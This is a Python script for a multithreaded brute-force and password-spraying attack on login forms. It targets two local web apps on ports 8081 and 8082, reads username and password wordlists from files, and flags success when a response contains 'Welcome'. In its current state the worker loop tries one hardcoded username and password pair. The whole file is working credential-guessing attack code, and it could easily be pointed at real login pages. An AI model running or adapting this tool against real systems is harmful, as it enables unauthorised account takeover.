import queue
import threading
from HTTP import HTTPQuery  # Import HTTPQuery class from HTTP.py
import requests
import time
import subprocess


lock = threading.Lock()
found_event = threading.Event()

# Global variables for the queue, passwords list, and password index
users = queue.Queue()
passwords = []
index = 0
passIndex = 0
tried_combinations = set()  # Set to track attempted username-password pairs

# Initialize HTTPQuery object with desired settings
# Setup for the first app on port 8081
http_query_8081 = HTTPQuery(
    host="http://127.0.0.1:8081",
    default_headers={"Content-Type": "application/x-www-form-urlencoded"},
    path="/login",
    use_post=True,
    use_json=False
)

# Setup for the second app on port 8082
http_query_8082 = HTTPQuery(
    host="http://127.0.0.1:8082",
    default_headers={"Content-Type": "application/x-www-form-urlencoded"},
    path="/login",
    use_post=True,
    use_json=False
)
actions = ['t',1,'t','t','t','s','t','t','u','t']
# Thread-safe function to get the next unique username-password pair
def getPass():
    global passIndex
    with lock:
        if passIndex >= len(passwords) or users.empty():
            return None, None

        password = passwords[passIndex]
        passIndex += 1

        if passIndex == len(passwords):
            passIndex = 0
            user = users.get()  # Get and remove the next user
        else:
            user = users.get()
            users.put(user)  # Put the user back for the next iteration

        return user, password

# Thread worker function to perform the brute-force attack
def worker():
    global index
    while not found_event.is_set():
        #user, password = getPass()
        
        user = "adejr12"
        password = "Zbff315"
        
        if user is None or password is None:
            break
        
        # Logging the current attempt clearly
        print(f"Attempting login for username: {user} and password: {password}")
        
        # Use http_query_8081 for sending login credentials
        if http_query_8081.perform_query(username=user, password=password, search_string="Welcome"):
            found_event.set()
            print(f"Found valid credentials at 8081: {user}:{password}")
            return

        # Use http_query_8082 for another kind of check if needed
        # Uncomment and adjust if you want to check 8082 as well
        if http_query_8082.perform_query(username=user, password=password, search_string="Welcome"):
            found_event.set()
            print(f"Found valid credentials at 8082 for user: {user}")
            return

        with lock:
            index += 1

# Function to perform the brute-force attack
def brute_force(u, p, passwordSpray=False):
    global users
    global passwords

    if passwordSpray:
        u, p = p, u

    users = queue.Queue()  # Initialize users as a Queue
    for user in u:
        users.put(user)
    passwords = p

    threads = []
    #Change from PS to PB each x seconds
    
    for _ in range(2):  # Adjust the number of threads as needed
        thread = threading.Thread(target=worker)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    return found_event.is_set()

# Function to read user list from a file
def read_user_list(file_path, delimiter=None, password_list=None):
    users = []
    passwords = []
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()
            if delimiter and not password_list:
                user, password = line.split(delimiter)
                users.append(user)
                passwords.append(password)
            else:
                users.append(line)
    return users, passwords

# Function to read password list from a file
def read_password_list(file_path):
    passwords = []
    with open(file_path, 'r') as file:
        for line in file:
            passwords.append(line.strip())
    return passwords


# Example usage
if __name__ == "__main__":
    user_file = "../Data/usernames.txt"
    password_file = "../Data/passwords.txt"
    delimiter = None

    users, passwords = read_user_list(user_file, delimiter)
    if not passwords:
        passwords = read_password_list(password_file)
    
    success = brute_force(users, passwords, False)
    if success:
        print("Valid credentials found!")
    else:
        print("No valid credentials found.")
